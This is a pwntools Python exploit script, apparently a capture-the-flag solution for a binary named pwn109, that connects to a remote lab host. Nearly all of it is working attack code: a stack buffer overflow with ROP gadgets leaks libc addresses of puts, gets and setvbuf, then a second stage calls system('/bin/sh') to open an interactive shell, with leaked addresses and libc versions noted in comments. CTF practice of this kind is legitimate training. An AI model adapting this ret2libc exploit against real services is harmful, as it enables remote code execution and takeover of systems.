from pwn import *

context.binary = binary = ELF('./pwn109.pwn109', checksec=False)
#context.log_level = 'debug'
'''
0x00000000004012a3 : pop rdi ; ret
0x00000000004012a1 : pop rsi ; pop r15 ; ret
0x000000000040129d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040101a : ret
'''
pop_rdi_ret  = p64(0x00000000004012a3)
ret = p64(0x000000000040101a)

main_address = p64(binary.sym.main)

print('main address', main_address)
plt_puts_address = p64(binary.plt.puts)
got_puts_address = p64(binary.got.puts)
got_gets_address = p64(binary.got.gets)
got_setvbuf_address = p64(binary.got.setvbuf)

payload = 0x20 * b'A'
payload += 0x8 * b'B'

payload += pop_rdi_ret + got_puts_address + plt_puts_address
payload += pop_rdi_ret + got_gets_address + plt_puts_address
payload += pop_rdi_ret + got_setvbuf_address + plt_puts_address
payload += main_address

print(payload)
#p = process()
p = remote('10.10.142.239', 9009)
p.recvuntil(b'Go ahead')
p.recvline()
p.send(payload)
p.sendline()
#p.interactive()
output = p.recvline()
output += p.recvline()
output += p.recvline()
puts_address = u64(output.split(b'\n')[0].ljust(8, b'\x00'))
gets_address = u64(output.split(b'\n')[1].ljust(8, b'\x00'))
setvbuf_address = u64(output.split(b'\n')[2].ljust(8, b'\x00'))
print("Leaked puts adddress:  {}".format(hex(u64(output.split(b'\n')[0].ljust(8, b'\x00')))))
print("Leaked gets adddress:  {}".format(hex(u64(output.split(b'\n')[1].ljust(8, b'\x00')))))
print("Leaked setvbuf adddress:  {}".format(hex(u64(output.split(b'\n')[2].ljust(8, b'\x00')))))

'''
Leaked puts adddress:  0x7f5f18f1caa0
Leaked puts adddress:  0x7f5f18f1c190
Leaked puts adddress:  0x7f5f18f1d3d0

libc6_2.27-3ubuntu1.3_amd64
libc6_2.27-3ubuntu1.4_amd64

https://libc.blukat.me/
'''

##############
## second stage: system(/bin/sh)
#############

'''
"/bin/sh" : 	0x133c8a
system : -0x30c40
'''

payload = 0x20 * b'A'
payload += 0x8 * b'B'
payload += ret + pop_rdi_ret + p64(gets_address + 0x133c8a) 
payload += p64(gets_address - 0x30c40)

#p.recvuntil(b'Go ahead')
#p.recvline()
p.send(payload)
p.interactive()




